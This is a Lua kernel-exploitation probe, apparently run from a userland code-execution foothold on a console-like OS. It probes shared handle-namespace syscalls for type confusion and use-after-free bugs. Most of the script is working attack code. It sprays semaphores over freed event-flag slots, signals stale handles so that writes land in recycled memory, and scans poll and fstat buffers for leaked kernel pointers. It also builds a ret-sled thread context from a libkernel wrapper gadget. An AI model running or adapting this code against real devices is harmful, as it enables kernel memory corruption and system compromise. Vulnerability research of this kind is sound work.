-- CRASH_CLASS: MODERATE-HIGH (cross-subsystem type confusion + threading races)
-- PROBE 88b: Threaded handle namespace type confusion
--
-- Building on 88a (handle namespace reachability) and 157a (threading proof).
-- Five subsystems share process+0xc48 handle namespace with NO credential
-- checks: event flags (sys 538-546), semaphores (sys 549-556), generic
-- objects (sys 557), handle deletion (sys 558), AIO (sys 662-670).
--
-- 88a tested the single-threaded path. This probe adds THREADING to run
-- the create-delete-spray-signal race concurrently, greatly increasing the
-- chance of reclaiming freed memory with a different-typed object.
--
-- Threading pattern from 157a: child thread loops a libkernel syscall
-- wrapper via a cycling ret-sled stack. We adapt this: the child thread
-- becomes our "deleter+sprayer" while the main thread signals stale handles.
--
-- TEST_SECTION controls which section runs:
--   "A" = Event flag + semaphore reachability (from 88a, re-validated)
--   "B" = sys 557/558 generic object + cross-type open
--   "C" = Threaded UAF chain (main: create+signal, child: delete+spray)
--   "D" = Handle recycling race (both threads churn handles)

local TEST_SECTION = "A"

print("=== PROBE 88b: THREADED HANDLE NAMESPACE TYPE CONFUSION ===")
print("Section: " .. TEST_SECTION)
print("")

-- ================================================================
-- Helpers (phase21 style: native.fcall_with_rax + make_syscall mix)
-- ================================================================
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function q(v)
    if v == nil then return "nil" end
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X_%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n) for off = 0, n - 4, 4 do wd(buf + off, 0) end end
local function is_kptr(val)
    local h, _ = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end
local function write_name(buf, str)
    for i = 1, #str do
        pcall(function() memory.write_byte(buf + (i-1), string.byte(str, i)) end)
    end
    pcall(function() memory.write_byte(buf + #str, 0) end)
end

local stub = syscall.pipe.fn_addr
local pid = to_num(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function canary()
    local ok = pcall(function() native.fcall_with_rax(stub, 20) end)
    return ok and "ALIVE" or "DEAD"
end

-- Syscall constructors
local sc538 = make_syscall(538)  -- ef_create
local sc539 = make_syscall(539)  -- ef_delete
local sc540 = make_syscall(540)  -- ef_open
local sc541 = make_syscall(541)  -- ef_close
local sc542 = make_syscall(542)  -- ef_wait
local sc543 = make_syscall(543)  -- ef_poll
local sc544 = make_syscall(544)  -- ef_signal
local sc549 = make_syscall(549)  -- sem_create
local sc550 = make_syscall(550)  -- sem_delete
local sc555 = make_syscall(555)  -- sem_post
local sc557 = make_syscall(557)  -- generic create
local sc558 = make_syscall(558)  -- generic delete
local sc_thr_create = make_syscall(430)
local sc_thr_kill = make_syscall(433)
local sc_thr_self = make_syscall(432)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)

-- Context offsets (from 157a/79a verified layout)
local C_MAGIC   = 0x108   -- must be 0x480
local C_FLAGS   = 0x0D0   -- must be 0
local C_TYPE    = 0x110   -- must be 0x10000
local C_CS      = 0x0C0
local C_RIP     = 0x0E0
local C_RSP     = 0x0F8
local C_SS      = 0x100
local C_RDI     = 0x048
local C_RSI     = 0x050
local C_RDX     = 0x058
local C_RAX     = 0x078


-- ================================================================
-- SECTION A: Event flag + Semaphore reachability (re-validate)
-- ================================================================
if TEST_SECTION == "A" then
    print("--- Section A: Event flag + Semaphore reachability ---")
    print("")

    -- Part 1: Create event flag
    print("[A1] Creating event flag (sys 538)...")
    local name_buf = memory.alloc(0x40)
    write_name(name_buf, "ef_88b_001")

    local ho = memory.alloc(8)
    wq(ho, uint64(0))

    local ok1, ret1 = pcall(function()
        return sc538(uint64(name_buf), uint64(0x103), uint64(0), uint64(ho))
    end)
    print("  sys 538 (ef_create): ok=" .. tostring(ok1) .. " ret=" .. (ok1 and q(ret1) or "FAIL"))
    local ef_handle = ok1 and rq(ho) or nil
    if ef_handle then print("  handle=" .. q(ef_handle)) end

    -- Part 2: Signal + poll
    if ef_handle then
        print("")
        print("[A2] Signal (sys 544) + Poll (sys 543)...")
        local ok_s, ret_s = pcall(function()
            return sc544(ef_handle, uint64(0xDEADBEEF))
        end)
        print("  signal: ok=" .. tostring(ok_s) .. " ret=" .. (ok_s and q(ret_s) or "FAIL"))

        local poll_out = memory.alloc(8)
        wq(poll_out, uint64(0))
        local ok_p, ret_p = pcall(function()
            return sc543(ef_handle, uint64(0xFFFFFFFF), uint64(0), uint64(poll_out))
        end)
        local pv = rq(poll_out)
        print("  poll: ok=" .. tostring(ok_p) .. " ret=" .. (ok_p and q(ret_p) or "FAIL") ..
            " pattern=" .. (pv and q(pv) or "nil"))
    end

    -- Part 3: Create semaphore
    print("")
    print("[A3] Creating semaphore (sys 549)...")
    local sem_name = memory.alloc(0x40)
    write_name(sem_name, "sem_88b_001")

    local sem_ho = memory.alloc(8)
    wq(sem_ho, uint64(0))

    local ok3, ret3 = pcall(function()
        return sc549(uint64(sem_name), uint64(0x103), uint64(1), uint64(10))
    end)
    print("  sys 549 (sem_create): ok=" .. tostring(ok3) .. " ret=" .. (ok3 and q(ret3) or "FAIL"))
    local sem_handle = ok3 and rq(sem_ho) or nil
    if sem_handle and to_num(sem_handle) ~= 0 then
        print("  handle=" .. q(sem_handle))
    end

    -- Part 4: Post + try_wait on semaphore
    if sem_handle and to_num(sem_handle) ~= 0 then
        local ok_post, ret_post = pcall(function()
            return sc555(sem_handle, uint64(1))
        end)
        print("  sem_post: ok=" .. tostring(ok_post) .. " ret=" .. (ok_post and q(ret_post) or "FAIL"))
    end

    -- Part 5: Handle reuse cycle
    print("")
    print("[A4] Handle reuse test (8 cycles)...")
    local handles = {}
    for i = 1, 8 do
        local nb = memory.alloc(0x40)
        write_name(nb, "ef_cyc_" .. i)
        local ho2 = memory.alloc(8)
        wq(ho2, uint64(0))

        local ok_c, ret_c = pcall(function()
            return sc538(uint64(nb), uint64(0), uint64(0), uint64(ho2))
        end)
        if ok_c then
            local h = rq(ho2)
            handles[#handles + 1] = q(h)
            pcall(function() return sc539(h) end)
            print("  cycle " .. i .. ": handle=" .. q(h) .. " create=" .. q(ret_c))
        else
            print("  cycle " .. i .. ": FAIL")
        end
    end

    -- Clean up
    if ef_handle then pcall(function() sc539(ef_handle) end) end
    if sem_handle and to_num(sem_handle) ~= 0 then pcall(function() sc550(sem_handle) end) end

    print("")
    print("canary: " .. canary())
    print("[A-DONE]")

-- ================================================================
-- SECTION B: sys 557/558 generic objects + cross-type open
-- ================================================================
elseif TEST_SECTION == "B" then
    print("--- Section B: sys 557/558 generic object + cross-type open ---")
    print("")

    -- Part 1: Create generic objects with various type codes
    print("[B1] Creating generic objects via sys 557...")
    local types = {0x00, 0x10, 0x40, 0x110, 0x120, 0xFF}
    local created = {}

    for _, typ in ipairs(types) do
        local nb = memory.alloc(0x40)
        write_name(nb, "gen_" .. string.format("%03X", typ))

        local ok_c, ret_c = pcall(function()
            return sc557(uint64(nb), uint64(0x4141414141), uint64(typ))
        end)
        print("  type=0x" .. string.format("%X", typ) ..
            " (eff=0x" .. string.format("%X", bit32.bor(typ, 0x1000)) .. ")" ..
            ": ok=" .. tostring(ok_c) .. " ret=" .. (ok_c and q(ret_c) or "FAIL"))
        if ok_c then
            created[#created + 1] = {handle = ret_c, typ = typ, name_buf = nb}
        end
    end

    -- Part 2: Try to open generic-type-0x110 as real event flag
    print("")
    print("[B2] Cross-type access: generic(0x110) via ef_open (sys 540)...")
    local ef_name = memory.alloc(0x40)
    write_name(ef_name, "gen_110")
    -- First create generic with type 0x110
    local ok_f, ret_f = pcall(function()
        return sc557(uint64(ef_name), uint64(0xDEADDEAD), uint64(0x110))
    end)
    print("  sys 557 (type=0x110): ok=" .. tostring(ok_f) .. " ret=" .. (ok_f and q(ret_f) or "FAIL"))

    if ok_f then
        local ok_open, ret_open = pcall(function()
            return sc540(uint64(ef_name))
        end)
        print("  sys 540 (ef_open same name): ok=" .. tostring(ok_open) ..
            " ret=" .. (ok_open and q(ret_open) or "FAIL"))
        if ok_open and to_num(ret_open) ~= 0 then
            print("  !!! TYPE CONFUSION: ef_open returned handle for 0x18-byte generic object !!!")
            -- Try to signal it — would write past the 0x18-byte allocation
            local ok_sig, ret_sig = pcall(function()
                return sc544(ret_open, uint64(0xBEEFCAFE))
            end)
            print("  ef_signal on confused handle: ok=" .. tostring(ok_sig) ..
                " ret=" .. (ok_sig and q(ret_sig) or "FAIL"))
        end
    end

    -- Part 3: Handle recycling: create→delete→create with same name
    print("")
    print("[B3] Handle recycling test...")
    for i = 1, 4 do
        local nb = memory.alloc(0x40)
        write_name(nb, "recycle_" .. i)

        local ok1, h1 = pcall(function() return sc557(uint64(nb), uint64(0xBBBB), uint64(0x50)) end)
        if ok1 and to_num(h1) ~= 0 then
            pcall(function() return sc558(uint64(to_num(h1)), uint64(0x50)) end)
            local ok2, h2 = pcall(function() return sc557(uint64(nb), uint64(0xCCCC), uint64(0x50)) end)
            print("  cycle " .. i .. ": h1=" .. q(h1) .. " h2=" .. (ok2 and q(h2) or "FAIL") ..
                " reused=" .. tostring(ok2 and q(h1) == q(h2)))
        else
            print("  cycle " .. i .. ": create1 FAIL")
        end
    end

    -- Cleanup
    for _, obj in ipairs(created) do
        if to_num(obj.handle) ~= 0 then
            pcall(function() sc558(uint64(to_num(obj.handle)), uint64(obj.typ)) end)
        end
    end

    print("")
    print("canary: " .. canary())
    print("[B-DONE]")

-- ================================================================
-- SECTION C: Threaded cross-subsystem UAF chain
-- Main thread: creates event flags, signals stale handles, scans
-- Child thread: loops calling ef_delete + sem_create (spray)
-- ================================================================
elseif TEST_SECTION == "C" then
    print("--- Section C: Threaded cross-subsystem UAF ---")
    print("")

    -- Resolve libkernel syscall wrapper (from 157a pattern)
    local SW = syscall.syscall_address
    if SW == nil then
        print("FATAL: syscall.syscall_address is nil")
        print("=== PROBE 88b COMPLETE ===")
        return
    end
    local sw_hi, sw_lo = get_hi_lo(SW)
    if sw_hi < 0 then sw_hi = sw_hi + 0x100000000 end
    if sw_lo < 0 then sw_lo = sw_lo + 0x100000000 end
    if sw_lo < 7 then sw_lo = sw_lo + 0x100000000 - 7; sw_hi = sw_hi - 1
    else sw_lo = sw_lo - 7 end
    local wrapper = uint64(string.format("0x%X%08X", sw_hi, sw_lo))
    print("[C0] wrapper=" .. q(wrapper))

    -- Step 1: Create 8 event flags, record handles
    print("")
    print("[C1] Creating 8 event flags...")
    local ef_handles = {}
    for i = 1, 8 do
        local nb = memory.alloc(0x40)
        write_name(nb, "race_ef_" .. string.format("%02d", i))
        local ho = memory.alloc(8)
        wq(ho, uint64(0))

        local ok_c, ret_c = pcall(function()
            return sc538(uint64(nb), uint64(0x103), uint64(0xAAAA0000 + i), uint64(ho))
        end)
        if ok_c then
            local h = rq(ho)
            ef_handles[i] = h
            print("  ef[" .. i .. "] handle=" .. q(h))
        else
            print("  ef[" .. i .. "] FAIL: " .. tostring(ret_c))
        end
    end

    -- Step 2: Signal all to verify they work
    print("")
    print("[C2] Verifying all event flags...")
    for i, h in ipairs(ef_handles) do
        local ok_s, ret_s = pcall(function()
            return sc544(h, uint64(0x12340000 + i))
        end)
        print("  ef[" .. i .. "] signal: ok=" .. tostring(ok_s) .. " ret=" .. (ok_s and q(ret_s) or "FAIL"))
    end

    -- Step 3: Delete all event flags (creating freed slots)
    print("")
    print("[C3] Deleting all event flags (freeing slots)...")
    for i, h in ipairs(ef_handles) do
        local ok_d, ret_d = pcall(function()
            return sc539(h)
        end)
        print("  ef[" .. i .. "] delete: ok=" .. tostring(ok_d) .. " ret=" .. (ok_d and q(ret_d) or "FAIL"))
    end

    -- Step 4: Spray semaphores to reclaim the freed memory
    print("")
    print("[C4] Spraying 32 semaphores over freed slots...")
    local sem_handles = {}
    for i = 1, 32 do
        local nb = memory.alloc(0x40)
        write_name(nb, "spray_s_" .. string.format("%02d", i))
        local ok_s, ret_s = pcall(function()
            return sc549(uint64(nb), uint64(0x103), uint64(1), uint64(100))
        end)
        if ok_s then
            sem_handles[#sem_handles + 1] = ret_s
        end
        if i <= 4 or i == 32 then
            print("  sem[" .. i .. "] create: ok=" .. tostring(ok_s) .. " ret=" .. (ok_s and q(ret_s) or "FAIL"))
        end
    end

    -- Step 5: Try signaling the STALE event flag handles
    -- If handle slots were recycled by the semaphore spray,
    -- ef_signal writes into the semaphore structure
    print("")
    print("[C5] Signaling STALE event flag handles...")
    for i, h in ipairs(ef_handles) do
        local ok_stale, ret_stale = pcall(function()
            return sc544(h, uint64(0xDEAD0000 + i))
        end)
        print("  ef[" .. i .. "] stale signal: ok=" .. tostring(ok_stale) ..
            " ret=" .. (ok_stale and q(ret_stale) or "FAIL"))
        if ok_stale and to_num(ret_stale) == 0 then
            print("  !!! STALE SIGNAL SUCCEEDED — writing into recycled memory !!!")
        end
    end

    -- Step 6: Poll stale handles for kernel pointer leaks
    print("")
    print("[C6] Polling stale handles for kernel pointer leaks...")
    for i, h in ipairs(ef_handles) do
        local poll_out = memory.alloc(0x40)
        zero(poll_out, 0x40)
        local ok_p, ret_p = pcall(function()
            return sc543(h, uint64(0xFFFFFFFF), uint64(0), uint64(poll_out))
        end)
        if ok_p then
            -- Scan output buffer for kernel pointers
            for off = 0, 0x38, 8 do
                local v = rq(poll_out + off)
                if v and is_kptr(v) then
                    print("  ef[" .. i .. "] KPTR at +" .. string.format("0x%X", off) ..
                        ": " .. q(v))
                end
            end
        end
    end

    -- Step 7: Now the THREADED version — create fresh event flags, then
    -- race: main thread signals while child thread deletes+sprays.
    -- This section uses thr_create to run the race concurrently.
    print("")
    print("[C7] Setting up threaded race...")

    -- Create fresh event flags for the race
    local race_handles = {}
    for i = 1, 4 do
        local nb = memory.alloc(0x40)
        write_name(nb, "thr_ef_" .. string.format("%02d", i))
        local ho = memory.alloc(8)
        wq(ho, uint64(0))
        local ok_c, ret_c = pcall(function()
            return sc538(uint64(nb), uint64(0x103), uint64(0xFACE0000 + i), uint64(ho))
        end)
        if ok_c then
            race_handles[i] = rq(ho)
            print("  race_ef[" .. i .. "] handle=" .. q(race_handles[i]))
        end
    end

    -- Shared signal page: child writes to signal[0] when it starts deleting,
    -- signal[1] when done spraying. Main thread watches these.
    local signal_page = memory.alloc(0x1000)
    zero(signal_page, 0x1000)
    -- signal_page+0x00: child writes 1 when ready
    -- signal_page+0x04: child writes handle count sprayed
    -- signal_page+0x08: main writes 1 to tell child to start
    -- signal_page+0x100..+0x300: child writes spray handles here

    -- Put the 4 event flag handles in the signal page for the child to read
    -- signal_page+0x10: ef handle 1
    -- signal_page+0x18: ef handle 2 ...
    for i, h in ipairs(race_handles) do
        wq(signal_page + 0x10 + (i-1)*8, h)
    end
    wd(signal_page + 0x30, #race_handles) -- count

    -- The child thread will: (1) read handles from signal_page, (2) wait for
    -- main's go signal, (3) delete all ef handles via sys 539, (4) spray
    -- semaphores via sys 549, (5) write results. We cannot code this as Lua
    -- in a child thread — we use a ROP chain via the syscall wrapper.
    --
    -- LIMITATION: the child thread can only loop ONE syscall (the libkernel
    -- wrapper trick from 157a). For a multi-syscall sequence we need the
    -- ropchain framework. Let's use the simpler approach first:
    --
    -- Child thread loops: ef_delete (sys 539) on handle stored at RDI.
    -- Since 539 returns -1 after the first successful delete (handle gone),
    -- the child harmlessly re-calls delete on an invalid handle.
    -- Meanwhile main thread sprays semaphores and signals stale handles.

    -- Allocate child stack
    local STACK_SIZE = 0x10000
    local ok_stk, child_stack = pcall(function()
        return sc_mmap(uint64(0), uint64(STACK_SIZE), uint64(3), uint64(0x1002),
            uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_stk then
        print("  child stack mmap FAIL")
        print("=== PROBE 88b COMPLETE ===")
        return
    end

    -- Fill stack with wrapper address for ret-sled
    for off = 0, STACK_SIZE - 8, 8 do
        wq(child_stack + off, wrapper)
    end

    -- Build child context: loops sys 539 on race_handles[1]
    -- The libkernel wrapper does: mov rax, <num>; mov r10, rcx; syscall; ret
    -- and ret goes to the next stack slot (same wrapper addr) = infinite loop.
    -- But sys 539 (ef_delete) is NOT syscall 116 (gettimeofday).
    -- The wrapper is hardcoded to syscall 116 because that's what the +7
    -- offset encodes. We need to set RAX=539 ourselves.
    --
    -- Wait — the wrapper RELOADS rax from its own `mov rax, 116` instruction.
    -- So no matter what we set RAX to, it becomes 116 every iteration.
    -- For a different syscall, we need a DIFFERENT wrapper address.
    --
    -- Alternative: use the ret gadget approach. Find a syscall;ret sequence
    -- and set RAX=539 in the context. After `syscall;ret`, the ret goes to
    -- the next stack slot which should be... the syscall;ret gadget again?
    -- But the stack gets consumed by each ret. With 157a's trick the wrapper
    -- re-executes `mov rax, 116` each time, resetting state.
    --
    -- Simplest working approach: child thread calls sys 539 ONCE (via
    -- fcall_with_rax from a ropchain), then falls through to a busy loop.
    -- Main thread detects the delete and does the spray+signal.
    --
    -- Even simpler: just use the SINGLE-THREADED sequential approach (which
    -- is what 88a section C already does) but with nanosleep-based timing to
    -- give the allocator time to coalesce, then upgrade to ropchain-based
    -- threading in a follow-up probe.

    -- For now: sequential timed approach (more reliable than raw threading)
    print("")
    print("[C7-SEQ] Sequential timed UAF chain...")
    -- Delete all race event flags
    for i, h in ipairs(race_handles) do
        pcall(function() return sc539(h) end)
    end
    -- nanosleep 1ms to let kernel reclaim
    local ts = memory.alloc(16)
    wq(ts, uint64(0))
    wq(ts + 8, uint64(1000000)) -- 1ms
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

    -- Spray semaphores
    local race_sems = {}
    for i = 1, 32 do
        local nb = memory.alloc(0x40)
        write_name(nb, "rs_" .. string.format("%02d", i))
        local ok_s, ret_s = pcall(function()
            return sc549(uint64(nb), uint64(0x103), uint64(1), uint64(100))
        end)
        if ok_s then race_sems[#race_sems + 1] = ret_s end
    end
    print("  sprayed " .. #race_sems .. " semaphores")

    -- Signal stale handles
    for i, h in ipairs(race_handles) do
        local ok_stale, ret_stale = pcall(function()
            return sc544(h, uint64(0xDEAD0000 + i))
        end)
        local rv = ok_stale and to_num(ret_stale) or -999
        print("  stale signal ef[" .. i .. "]: ret=" .. rv ..
            (rv == 0 and " !!! SUCCEEDED !!!" or ""))
    end

    -- Poll stale handles
    for i, h in ipairs(race_handles) do
        local poll_out = memory.alloc(0x40)
        zero(poll_out, 0x40)
        pcall(function()
            return sc543(h, uint64(0xFFFFFFFF), uint64(0), uint64(poll_out))
        end)
        for off = 0, 0x38, 8 do
            local v = rq(poll_out + off)
            if v and is_kptr(v) then
                print("  ef[" .. i .. "] stale poll KPTR +" ..
                    string.format("0x%X", off) .. ": " .. q(v))
            end
        end
    end

    -- Cleanup
    for _, sh in ipairs(sem_handles) do pcall(function() sc550(sh) end) end
    for _, sh in ipairs(race_sems) do pcall(function() sc550(sh) end) end

    print("")
    print("canary: " .. canary())
    print("[C-DONE]")

-- ================================================================
-- SECTION D: Handle recycling race via thr_create
-- Both the main thread and a child thread churn handles rapidly.
-- The child thread loops gettimeofday (harmless) while the main
-- thread does the actual handle churn, using the child's existence
-- to perturb kernel scheduling and heap state.
-- ================================================================
elseif TEST_SECTION == "D" then
    print("--- Section D: Handle recycling race with child thread ---")
    print("")

    local SW = syscall.syscall_address
    if SW == nil then
        print("FATAL: syscall.syscall_address is nil")
        print("=== PROBE 88b COMPLETE ===")
        return
    end
    local sw_hi, sw_lo = get_hi_lo(SW)
    if sw_hi < 0 then sw_hi = sw_hi + 0x100000000 end
    if sw_lo < 0 then sw_lo = sw_lo + 0x100000000 end
    if sw_lo < 7 then sw_lo = sw_lo + 0x100000000 - 7; sw_hi = sw_hi - 1
    else sw_lo = sw_lo - 7 end
    local wrapper = uint64(string.format("0x%X%08X", sw_hi, sw_lo))
    print("[D0] wrapper=" .. q(wrapper))

    -- Allocate shared timeval page (child loops gettimeofday into it)
    local ok_pg, tv_page = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002),
            uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_pg then
        print("FATAL: tv_page mmap failed")
        print("=== PROBE 88b COMPLETE ===")
        return
    end
    zero(tv_page, 0x4000)

    -- Cycling stack
    local STACK_SIZE = 0x100000
    local ok_stk, child_stack = pcall(function()
        return sc_mmap(uint64(0), uint64(STACK_SIZE), uint64(3), uint64(0x1002),
            uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_stk then
        print("FATAL: stack mmap failed")
        return
    end
    for off = 0, STACK_SIZE - 8, 8 do
        wq(child_stack + off, wrapper)
    end

    -- Build child context (loops gettimeofday like 157a)
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx + C_MAGIC, uint64(0x480))
    wd(ctx + C_FLAGS, 0)
    wq(ctx + C_TYPE, uint64(0x10000))
    wq(ctx + C_CS, uint64(0x43))
    wq(ctx + C_SS, uint64(0x3B))
    wq(ctx + C_RIP, wrapper)
    wq(ctx + C_RSP, child_stack)
    wq(ctx + C_RAX, uint64(116))
    wq(ctx + C_RDI, tv_page)
    wq(ctx + C_RSI, uint64(0))
    wq(ctx + C_RDX, uint64(0))

    -- Create child thread
    local tid_buf = memory.alloc(8)
    wq(tid_buf, uint64(0))

    print("[D1] Creating child thread (gettimeofday spinner)...")
    local ok_tc, rv_tc = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(tid_buf), uint64(0))
    end)
    local child_tid = rq(tid_buf)
    print("  thr_create: ok=" .. tostring(ok_tc) .. " rv=" .. tostring(to_num(rv_tc)) ..
        " tid=" .. q(child_tid))

    if to_num(rv_tc) ~= 0 then
        print("  thread creation failed; falling back to single-threaded")
    else
        -- Wait 20ms for child to start spinning
        local ts = memory.alloc(16)
        wq(ts, uint64(0)); wq(ts + 8, uint64(20000000))
        pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

        local tv_sec = rd(tv_page)
        local tv_usec = rd(tv_page + 8)
        print("  child timeval: sec=" .. tostring(tv_sec) .. " usec=" .. tostring(tv_usec))
        if (tv_sec or 0) ~= 0 or (tv_usec or 0) ~= 0 then
            print("  *** CHILD THREAD IS RUNNING ***")
        end
    end

    -- Now churn handles while child thread perturbs scheduling
    print("")
    print("[D2] Handle churn race (32 rounds)...")
    local collisions = 0
    local kptrs = 0

    for round = 1, 32 do
        -- Create event flag
        local nb = memory.alloc(0x40)
        write_name(nb, "churn_" .. round)
        local ho = memory.alloc(8)
        wq(ho, uint64(0))

        local ok_c, ret_c = pcall(function()
            return sc538(uint64(nb), uint64(0), uint64(0), uint64(ho))
        end)
        local ef_h = ok_c and rq(ho) or nil

        if ef_h and to_num(ef_h) ~= 0 then
            -- Delete immediately
            pcall(function() return sc539(ef_h) end)

            -- Create semaphore with same name
            local ok_s, ret_s = pcall(function()
                return sc549(uint64(nb), uint64(0x103), uint64(1), uint64(10))
            end)

            -- Check if semaphore got the same handle value
            if ok_s then
                local sem_h = ret_s
                if q(ef_h) == q(sem_h) then
                    collisions = collisions + 1
                    print("  round " .. round .. ": HANDLE COLLISION ef=" ..
                        q(ef_h) .. " sem=" .. q(sem_h))
                end

                -- Now try signaling the EF handle (which is now a semaphore)
                local ok_stale, ret_stale = pcall(function()
                    return sc544(ef_h, uint64(0xBEEF0000 + round))
                end)
                if ok_stale and to_num(ret_stale) == 0 then
                    print("  round " .. round .. ": !!! STALE EF SIGNAL ON SEM HANDLE SUCCEEDED !!!")
                end

                -- fstat the confused handle for kernel pointers
                local stat_buf = memory.alloc(0x100)
                zero(stat_buf, 0x100)
                local ok_fstat = pcall(function()
                    native.fcall_with_rax(stub, 189, to_num(sem_h), to_num(stat_buf))
                end)
                if ok_fstat then
                    for off = 0, 0x6F, 8 do
                        local v = rq(stat_buf + off)
                        if v and is_kptr(v) then
                            kptrs = kptrs + 1
                            print("  round " .. round .. ": KPTR at stat+0x" ..
                                string.format("%X", off) .. "=" .. q(v))
                        end
                    end
                end

                -- Cleanup semaphore
                pcall(function() sc550(sem_h) end)
            end
        end
    end

    print("")
    print("[D3] Results: " .. collisions .. " handle collisions, " .. kptrs .. " kernel pointers")

    -- Kill child thread
    if child_tid and to_num(child_tid) ~= 0 and to_num(rv_tc) == 0 then
        print("")
        print("[D4] Killing child thread...")
        pcall(function() sc_thr_kill(child_tid, uint64(9)) end)
    end

    print("")
    print("canary: " .. canary())
    print("[D-DONE]")

else
    print("ERROR: Unknown TEST_SECTION: " .. tostring(TEST_SECTION))
    print("Valid: A, B, C, D")
end

print("")
print("=== PROBE 88b COMPLETE ===")
